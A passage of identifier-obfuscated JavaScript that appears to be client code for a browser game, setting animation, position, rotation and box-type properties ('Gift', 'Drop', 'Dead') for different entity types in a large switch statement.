						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, ᐃᐃⲆΔ, 0, ⲆΔΔᐃᐃ, 10),
						"ⵠⲆᐃ": ΔᐃᐃⲆⲆ,
						angle: 0
					};
					break;
				case ⲆⲆᐃ.ⵠΔⲆᐃΔ:
					this.ⵠᐃⲆⲆᐃ = ᐃᐃⵠⵠⵠⲆⵠⲆⵠ;
					this.ᐃΔⵠᐃΔ = ΔΔⵠⲆᐃᐃⲆⲆⵠ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔᐃⲆⵠ, 1, ᐃⵠΔ, 10, ⲆⲆⲆΔᐃ),
						"ⵠⲆᐃ": ΔΔⵠⲆΔ,
						angle: ⲆΔⵠ
					};
					this.ᐃΔᐃⵠ = [];
					for (var ⵠᐃ = Δⵠᐃ; 3 > ⵠᐃ; ⵠᐃ++) this.ᐃΔᐃⵠ.push({
						"ΔᐃΔⵠ": ΔᐃΔⲆⲆᐃᐃⵠΔ,
						"ᐃΔⲆⲆ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2)
					});
					this.ᐃΔᐃⵠ[ᐃⵠⲆ].x = this.x - 16.5;
					this.ᐃΔᐃⵠ[ΔᐃΔΔ].y = this.y - 15.5;
					this.ᐃΔᐃⵠ[ᐃⵠΔ].angle = this.angle;
					this.ᐃΔᐃⵠ[ΔⵠⲆΔ].x = this.x + 36;
					this.ᐃΔᐃⵠ[Ⲇᐃⵠ].y = this.y + 17;
					this.ᐃΔᐃⵠ[ⵠΔⵠΔ].angle = this.angle;
					this.ᐃΔᐃⵠ[2].x = this.x - 18.5;
					this.ᐃΔᐃⵠ[ΔⵠⵠΔ].y = this.y + 39;
					this.ᐃΔᐃⵠ[ⵠⵠΔⲆ].angle = this.angle;
					break;
				case ⲆⲆᐃ.ⵠΔⵠᐃΔ:
					this.ⵠᐃⲆⲆᐃ = ⵠᐃᐃⵠⲆΔΔᐃⲆ;
					this.ᐃΔⵠᐃΔ = ᐃΔⵠᐃΔⵠⵠΔⲆ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃΔᐃΔ, .9, 1.05, .9, .2, .2);
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, ⵠΔⵠΔ, ΔⲆⵠⲆ, 10, ⲆⵠⲆⵠⲆ),
						"ⵠⲆᐃ": false,
						angle: ᐃⵠΔ
					};
					this.ᐃΔᐃⵠ = [];
					for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < ᐃⵠⲆΔᐃ; ⵠᐃ++) this.ᐃΔᐃⵠ.push({
						"ΔᐃΔⵠ": ⲆⵠⵠΔⵠⲆⵠ,
						"ᐃΔⲆⲆ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃΔᐃΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2)
					});
					this.ᐃΔᐃⵠ[ᐃⵠⲆ].x = this.x - 16.5;
					this.ᐃΔᐃⵠ[0].y = this.y - 15.5;
					this.ᐃΔᐃⵠ[1].x = this.x - 5.5;
					this.ᐃΔᐃⵠ[ΔⲆᐃᐃ].y = this.y + 7.5;
					this.ᐃΔᐃⵠ[ᐃⲆΔⲆ].x = this.x + ⲆᐃΔⵠΔ;
					this.ᐃΔᐃⵠ[2].y = this.y - 5;
					break;
				case ⲆⲆᐃ.ⲆⵠᐃⵠⲆ:
					this.ΔᐃΔⵠ = ⲆΔΔΔᐃΔᐃⲆⲆ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⵠⵠᐃΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ΔⲆⵠⲆ, 5, 3);
					break;
				case ⲆⲆᐃ.ⵠᐃᐃⵠⵠ:
					this.ΔᐃΔⵠ = ⵠᐃⲆΔΔᐃⵠⵠᐃ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔⵠⲆΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, Δᐃᐃᐃ, ᐃⲆⵠΔ, ⲆⲆΔⲆ);
					break;
				case ⲆⲆᐃ.ᐃⵠᐃᐃΔ:
					this.ΔᐃΔⵠ = ⵠⲆⲆᐃΔⵠΔΔᐃ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.ⲆΔΔᐃΔΔⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.ᐃⲆᐃⵠΔⵠⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, 5, ᐃⲆΔⵠ);
					this.ΔΔᐃⵠⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, .6, .6, ᐃΔΔ, ᐃΔΔⲆ, ⲆⲆΔⲆ);
					break;
				case ⲆⲆᐃ.ⲆΔᐃᐃΔ:
					this.ΔᐃΔⵠ = ΔⵠΔᐃᐃΔΔⵠⲆ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.ⲆΔΔᐃΔΔⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆⲆᐃⵠ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.ᐃⲆᐃⵠΔⵠⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ΔΔⵠ, 5, 3);
					this.ΔΔᐃⵠⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, 5, 3);
					break;
				case ⲆⲆᐃ.ΔⵠᐃᐃΔ:
					this.ΔᐃΔⵠ = ΔΔᐃⵠⲆΔⵠⲆᐃ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, ⵠⲆᐃᐃ, 3);
					break;
				case ⲆⲆᐃ.ΔⵠⵠⲆᐃ:
					this.ΔᐃΔⵠ = ⵠᐃΔⵠⵠⲆⵠ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .5, .5);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔΔⵠⲆΔ, .6, .6, 0, 5, 3);
					break;
				case ⲆⲆᐃ.ⲆⲆⵠᐃΔ:
					this.ⲆⵠⲆⵠᐃ = this.info & 15;
					this.ΔⵠΔⲆΔᐃᐃ = this.ΔⵠΔⵠⲆ & ΔᐃᐃⲆ;
					this.ΔΔⲆⲆⲆΔᐃ = 0;
					this.x = this.info;
					this.y = this.ΔⵠΔⵠⲆ;
					this.ΔᐃΔⵠ = ᐃᐃⲆⲆⵠⲆⵠⲆⵠ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .6, .6);
					break;
				case ⲆⲆᐃ.ᐃᐃᐃⲆᐃ:
				case ⲆⲆᐃ.ΔⵠᐃⲆᐃ:
				case ⲆⲆᐃ.ⲆⲆⵠᐃⲆ:
				case ⲆⲆᐃ.ᐃⵠⵠᐃⵠ:
				case ⲆⲆᐃ.ⲆⵠΔᐃΔ:
				case ⲆⲆᐃ.ᐃᐃᐃΔᐃ:
				case ⲆⲆᐃ.ᐃΔⵠⲆⵠ:
				case ⲆⲆᐃ.ᐃΔΔᐃΔ:
				case ⲆⲆᐃ.ΔⵠΔⵠⵠ:
					this.ΔᐃΔⵠ = ⵠᐃΔⵠⵠⲆⵠ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, ⵠⵠΔΔ, 3);
					break;
				case ⲆⲆᐃ.ᐃⵠᐃⲆᐃ:
					this.ΔᐃΔⵠ = ΔᐃⲆⵠⲆᐃⲆᐃᐃ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔΔⵠⲆΔ, 1, ⵠΔᐃ, 0, 10, 10),
						"ⵠⲆᐃ": ᐃⵠⵠᐃΔ,
						angle: 0
					};
					break;
				case ⲆⲆᐃ.ⲆⵠᐃⲆⵠ:
					this.ᐃΔⵠᐃΔ = ⵠⲆⵠΔⵠΔⵠᐃΔ;
					this.ΔᐃΔⵠ = ᐃΔⲆᐃⵠⲆⵠΔᐃ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⵠⵠⲆᐃ, ᐃᐃⲆΔ, ⲆⵠⲆⲆ, Δᐃᐃᐃ, ᐃⵠΔⵠⵠ, ⲆⵠΔΔᐃ),
						"ⵠⲆᐃ": false,
						angle: ΔΔⵠⵠ
					};
					this.up = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1.03, .98, .1, .1);
					this.ᐃⵠΔⲆΔ = [];
					break;
				case ⲆⲆᐃ.ᐃⲆΔⵠΔ:
					this.angle = Math.PI * Math.random() / ΔⵠᐃⲆ;
					this.ΔᐃΔⵠ = ᐃΔⲆᐃⵠᐃΔᐃⵠ;
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, .6, .6, ⵠᐃⲆᐃ, ⵠⵠΔΔ, 3);
					this.boxType = "Gift";
					this.hits = 0;
					break;
				case ⲆⲆᐃ.ⲆᐃⲆΔᐃ:
					this.ΔᐃΔⵠ = ᐃΔⲆᐃⵠᐃΔᐃⵠ;
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, .6, .6, ⵠᐃⲆᐃ, ⵠⵠΔΔ, 3);
					this.boxType = "Drop";
					this.disappearTime = +new Date + 17e3;
					this.hits = 0;
					break;
				case ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ:
					this.ΔᐃΔⵠ = ᐃΔⲆᐃⵠᐃΔᐃⵠ;
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, .6, .6, ⵠᐃⲆᐃ, ⵠⵠΔΔ, 3);
					this.boxType = "Dead";
					this.disappearTime = +new Date + 241e3;
					this.hits = 0;
					break;
				case ⲆⲆᐃ.ⵠᐃⵠⵠΔ:
					this.ΔᐃΔⵠ = ᐃⵠⵠΔⵠⵠⵠⲆⵠ;
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ᐃⵠⲆ, ᐃⲆⵠΔ, ΔΔᐃΔ);
					break;
				case ⲆⲆᐃ.ⲆᐃⲆᐃⵠ:
					this.scale = ΔᐃⲆⵠ;
					this.ΔᐃΔⵠ = ΔⵠᐃΔΔᐃⲆΔⲆ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 0, -Math.PI / 6, .5, 1);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔⲆᐃΔ, .6, .6, Δᐃᐃᐃ, 5, ⲆΔⵠⵠ);
					break;
				case ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ:
					this.ᐃⲆⲆⲆⵠ = ⵠⲆᐃⵠ;
					this.ⵠⲆⲆⵠ = [];
					this.ΔᐃⵠⵠⲆΔΔ = ΔⲆⵠⲆ;
					this.ⵠⲆΔΔΔᐃΔ = ⲆΔⲆᐃᐃⵠᐃⲆⵠ;
					this.ΔᐃΔⵠ = ⵠΔΔΔᐃⲆᐃⲆⲆ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃΔΔⵠ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃᐃⲆⲆ, 0, 0, -Math.PI / 6, .5, ᐃᐃⲆΔ);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, .6, .6, 0, ᐃⲆⵠΔ, Δⵠᐃⵠ);
					break;
				case ⲆⲆᐃ.ΔⲆⲆⵠⲆ:
					this.x = this.info;
					this.y = this.ΔⵠΔⵠⲆ;
					this.scale = 1;
					this.ᐃΔΔᐃ = 0;
					this.ΔᐃΔⵠ = ΔⲆⵠΔΔⵠᐃΔⵠ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ᐃⵠⲆⵠ, ᐃⵠⲆⵠ, -Math.PI / ⵠⲆⵠⲆΔ, .5, 1);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, ⲆⲆΔⵠ, ⲆᐃΔᐃ);
					break;
				case ⲆⲆᐃ.ΔΔΔⲆⲆ:
					this.x = this.info;
					this.y = this.ΔⵠΔⵠⲆ;
					this.scale = ⵠⲆΔ;
					this.ᐃΔΔᐃ = ⵠⲆⲆ;
					this.ΔᐃΔⵠ = ᐃⲆⲆᐃΔᐃᐃᐃⵠ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ᐃΔΔ, 0, -Math.PI / ΔⵠⵠⲆΔ, .5, 1);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ⵠᐃⲆᐃ, ΔⲆΔΔ, ᐃⵠⲆΔᐃ);
					break;
				case ⲆⲆᐃ.ΔⵠⵠΔⲆ:
					this.scale = 1;
					this.ΔᐃΔⵠ = ⵠΔⵠΔΔⲆⲆⵠΔ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃⵠᐃⲆ, 0, ΔᐃΔΔ, -Math.PI / ⵠⵠⵠⲆⲆ, .5, 1);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔᐃⲆΔ, .6, .6, ⵠΔⲆⵠ, 5, 3);
					break;
				case ⲆⲆᐃ.ⵠⲆᐃⲆᐃ:
					this.scale = ΔⲆⵠ;
					this.ΔᐃΔⵠ = ΔⵠΔΔΔⵠⵠᐃⲆ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, Δᐃᐃⵠ, ΔⲆⵠⲆ, -Math.PI / 6, .5, ⵠΔⵠΔ);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⵠⵠᐃΔ, .6, .6, ΔⲆⲆ, ⵠⲆᐃᐃ, ΔⲆᐃⲆ);
					break;
				case ⲆⲆᐃ.ΔΔⵠΔΔ:
					this.scale = 1;
					this.ΔᐃΔⵠ = ᐃᐃᐃⲆΔᐃᐃᐃᐃ;
					this.ᐃΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, .9 + Math.random() * .15, 1.05, .9, .2, .2);
					this.rotate = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 0, -Math.PI / ⲆᐃⲆΔΔ, .5, 1);
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃΔᐃΔ, .6, .6, 0, 5, ᐃᐃⲆΔⵠ);
					break;
				case ⲆⲆᐃ.ⲆⲆΔΔᐃ:
					this.ᐃΔᐃⵠ = [];
					for (var ⵠᐃ = ᐃΔΔ; 5 > ⵠᐃ; ⵠᐃ++) this.ᐃΔᐃⵠ.push({
						"ΔᐃΔⵠ": ⲆⵠⵠΔⵠⲆⵠ,
						"ᐃΔⲆⲆ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9 + Math.random() * .15, 1.05, .9, .2, .2)
					});
					switch (this.id % ᐃᐃⲆⲆ) {
						case 0:
							this.ᐃΔᐃⵠ[Ⲇᐃᐃᐃ].x = this.x - 20.5;
							this.ᐃΔᐃⵠ[Ⲇᐃⵠⵠ].y = this.y - 22.5;
							this.ᐃΔᐃⵠ[ᐃᐃⵠ].x = this.x - 35.5;
							this.ᐃΔᐃⵠ[1].y = this.y + 7.5;
							this.ᐃΔᐃⵠ[ⵠⲆⵠⲆ].x = this.x + 7.5;
							this.ᐃΔᐃⵠ[2].y = this.y - 30;
							this.ᐃΔᐃⵠ[ᐃⵠⲆΔᐃ].x = this.x + 22.5;
							this.ᐃΔᐃⵠ[ΔΔⵠΔ].y = this.y;
							this.ᐃΔᐃⵠ[4].x = this.x - 7.5;
							this.ᐃΔᐃⵠ[ᐃⵠⵠΔ].y = this.y + 14.5;
							break;
						case ⵠᐃⵠΔ:
							this.ᐃΔᐃⵠ[ΔⲆⲆ].x = this.x - 30.5;
							this.ᐃΔᐃⵠ[ᐃΔΔ].y = this.y - 22.5;
							this.ᐃΔᐃⵠ[ⵠΔᐃ].x = this.x - 15.5;
							this.ᐃΔᐃⵠ[1].y = this.y + 7.5;
							this.ᐃΔᐃⵠ[2].x = this.x + 15.5;
							this.ᐃΔᐃⵠ[ᐃⵠⲆⲆⲆ].y = this.y - 30;
							this.ᐃΔᐃⵠ[3].x = this.x + 12.5;
							this.ᐃΔᐃⵠ[ⲆΔⵠⵠ].y = this.y + 5;
							this.ᐃΔᐃⵠ[ⲆΔⵠᐃ].x = this.x - 40.5;
							this.ᐃΔᐃⵠ[4].y = this.y + 14.5;
							break;
						case Ⲇᐃᐃⵠ:
							this.ᐃΔᐃⵠ[0].x = this.x - 20.5;
							this.ᐃΔᐃⵠ[0].y = this.y - 20.5;
							this.ᐃΔᐃⵠ[ⵠⲆΔ].x = this.x - 35.5;
							this.ᐃΔᐃⵠ[ΔΔΔ].y = this.y + 15.5;
							this.ᐃΔᐃⵠ[ⲆΔΔⵠ].x = this.x + 7.5;
							this.ᐃΔᐃⵠ[2].y = this.y - ⲆᐃⲆⲆΔⲆⲆ;
							this.ᐃΔᐃⵠ[3].x = this.x + 22.5;
							this.ᐃΔᐃⵠ[ΔΔⵠΔ].y = this.y + ᐃⲆⵠΔ;
							this.ᐃΔᐃⵠ[ᐃⲆᐃⲆⵠ].x = this.x - 7.5;
							this.ᐃΔᐃⵠ[ⲆⵠᐃΔ].y = this.y + 1.5;
							break
					}
					break;
				case ⲆⲆᐃ.ⲆⵠⲆΔⲆ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, ΔΔΔ, ⵠⲆᐃⵠ, 10, ΔᐃⲆⲆⵠ),
						"ⵠⲆᐃ": ΔΔⵠⲆΔ,
						angle: ΔΔⵠ
					};
					this.ΔᐃΔⵠ = ⲆᐃⲆᐃΔΔⵠⵠᐃ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					this.ⲆⲆΔⲆⲆᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆᐃⵠⲆⵠ, ⵠΔⲆⵠ, Math.PI / 30, -Math.PI / 30, .06, .06);
					break;
				case ⲆⲆᐃ.ⵠⵠᐃⵠⲆ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ⵠΔᐃ, Ⲇᐃⵠ, ΔⲆⵠⲆ, ΔᐃⲆⵠⵠΔⵠ, ⲆⵠⲆᐃⲆ),
						"ⵠⲆᐃ": ᐃᐃⵠΔⵠ,
						angle: 0
					};
					this.ΔᐃΔⵠ = ⵠⲆⲆᐃᐃᐃΔⲆᐃ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ⵠⲆⲆⵠⲆ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, ΔᐃᐃⲆ, ⵠⲆΔ, ⲆΔⵠ, 10, ᐃΔᐃΔⲆ),
						"ⵠⲆᐃ": false,
						angle: 0
					};
					this.ΔᐃΔⵠ = ΔⵠΔᐃᐃᐃΔΔⵠ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ΔᐃⲆᐃⵠ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, ᐃΔᐃⲆ, ᐃᐃⲆΔ, ᐃⵠⲆⵠ, ⲆⲆΔΔⲆⲆⵠ, 10),
						"ⵠⲆᐃ": ⲆⲆⲆᐃⵠ,
						angle: 0
					};
					this.ΔᐃΔⵠ = ⲆΔⵠⲆᐃΔⲆⵠⵠ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ΔᐃⲆⲆΔ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ⵠΔΔ, ΔΔΔ, 0, 10, 10),
						"ⵠⲆᐃ": ᐃᐃΔᐃΔ,
						angle: 0
					};
					this.ΔᐃΔⵠ = ⲆᐃΔᐃΔⲆⵠΔᐃ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⵠⵠⲆᐃ, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ᐃΔⵠⵠⲆ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃᐃⲆⲆ, 1, ⵠΔᐃ, 0, ΔᐃⲆⲆⵠ, 10),
						"ⵠⲆᐃ": ⲆⵠΔⵠΔ,
						angle: 0
					};
					this.ΔᐃΔⵠ = ⲆⲆⵠᐃⲆⲆⲆΔᐃ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃΔΔⵠ, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ⵠⵠΔⲆⵠ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ᐃⲆᐃ, ⵠΔⲆ, 0, ⲆⲆⲆΔᐃ, 10),
						"ⵠⲆᐃ": ⲆⲆⲆᐃⵠ,
						angle: ⵠⲆⲆ
					};
					this.ΔᐃΔⵠ = ⵠᐃⲆⲆᐃⵠⲆᐃⲆ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .9, 1.05, .9, .2, .2);
					break;
				case ⲆⲆᐃ.ᐃⵠᐃⲆⵠ:
					this.ΔᐃΔⵠ = ᐃᐃⵠΔⲆᐃⲆΔⵠ;
					this.rotate = Ⲇᐃⵠⵠ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆⲆᐃⵠ, 1, 1, 0, ⲆⵠΔΔᐃ, 10),
						"ⵠⲆᐃ": false,
						angle: ᐃⵠⲆ
					};
					break;
				case ⲆⲆᐃ.ⲆΔΔΔᐃ:
					this.ΔᐃΔⵠ = ΔⲆᐃⵠⵠΔΔᐃⵠ;
					this.rotate = 0;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, 1, ᐃᐃⲆΔ, 0, 10, ΔᐃⲆⲆⵠ),
						"ⵠⲆᐃ": false,
						angle: ᐃⵠⲆⵠ
					};
					break;
				case ⲆⲆᐃ.ⵠⵠΔⵠⵠ:
					this.ΔᐃΔⵠ = ⵠᐃᐃΔᐃⲆᐃⲆⵠ;
					this.rotate = ΔⲆⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, Ⲇᐃⵠ, 1, ⵠᐃⲆᐃ, 10, 10),
						"ⵠⲆᐃ": false,
						angle: ⵠⲆⲆ
					};
					break;
				case ⲆⲆᐃ.ᐃᐃΔⲆⲆ:
					this.ΔᐃΔⵠ = ⲆᐃⲆΔⲆᐃΔᐃᐃ;
					this.rotate = 0;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, ᐃΔᐃⲆ, 0, ⲆΔΔᐃᐃ, 10),
						"ⵠⲆᐃ": ᐃᐃΔᐃΔ,
						angle: ΔΔⵠⵠ
					};
					break;
				case ⲆⲆᐃ.ⵠᐃΔⲆᐃ:
					this.ΔᐃΔⵠ = ᐃⵠᐃΔⲆΔΔΔᐃ;
					this.rotate = 0;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠΔⲆⲆⲆ, Ⲇᐃⵠ, 1, 0, 10, 10),
						"ⵠⲆᐃ": ⵠᐃⵠᐃᐃ,
						angle: 0
					};
					break;
				case ⲆⲆᐃ.ΔΔⲆᐃᐃ:
					this.ⵠᐃⲆⲆᐃ = ⵠᐃᐃⲆⲆΔΔⵠⲆ;
					this.ᐃΔⵠᐃΔ = ⲆⲆᐃⵠΔᐃΔΔᐃ;
					this.rotate = ΔⲆⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, ᐃᐃⲆΔ, 0, 10, 10),
						"ⵠⲆᐃ": false,
						angle: 0
					};
					break;
				case ⲆⲆᐃ.ⵠΔⲆᐃⵠ:
					this.ΔᐃΔⵠ = ᐃⵠᐃⵠⲆΔᐃᐃⵠ;
					this.ᐃⵠᐃⵠ = Math.floor(this.x / 100);
					this.ⵠᐃ = Math.floor(this.y / ᐃΔⲆⲆᐃ);
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃΔΔⵠ, 1, 1, 0, ⲆⵠⲆᐃⲆ, 10),
						"ⵠⲆᐃ": false,
						angle: 0
					};
					this.opacity = 1;
					this.ᐃΔᐃⵠᐃ = ⵠᐃᐃΔΔᐃΔ;
					break;
				case ⲆⲆᐃ.ᐃⲆⲆⲆᐃ:
					this.ΔᐃΔⵠ = ⲆᐃⵠⵠΔᐃⵠᐃᐃ;
					this.ΔⲆΔⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠᐃΔΔⵠ, 1, 1.15, 1, .3, .3);
					this.color = 0;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⵠΔⵠΔ, ΔᐃᐃⲆ, 1, Ⲇᐃⵠⵠ, ⵠⵠΔⲆᐃ, 10),
						"ⵠⲆᐃ": ⲆⲆⲆᐃⵠ,
						angle: ⵠᐃⲆᐃ
					};
					break;
				case ⲆⲆᐃ.ⵠᐃΔⲆⲆ:
				case ⲆⲆᐃ.ᐃⲆⲆΔᐃ:
				case ⲆⲆᐃ.ⲆⵠΔΔⵠ:
				case ⲆⲆᐃ.ΔⲆᐃΔⵠ:
				case ⲆⲆᐃ.ⲆΔᐃⲆᐃ:
					this.ΔᐃΔⵠ = ⵠⵠΔⵠⵠᐃⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ΔΔΔ, 1, ⵠⲆᐃⵠ, 10, 10),
						"ⵠⲆᐃ": ⲆΔᐃⲆΔ,
						angle: ⵠΔⲆⵠ
					};
					break;
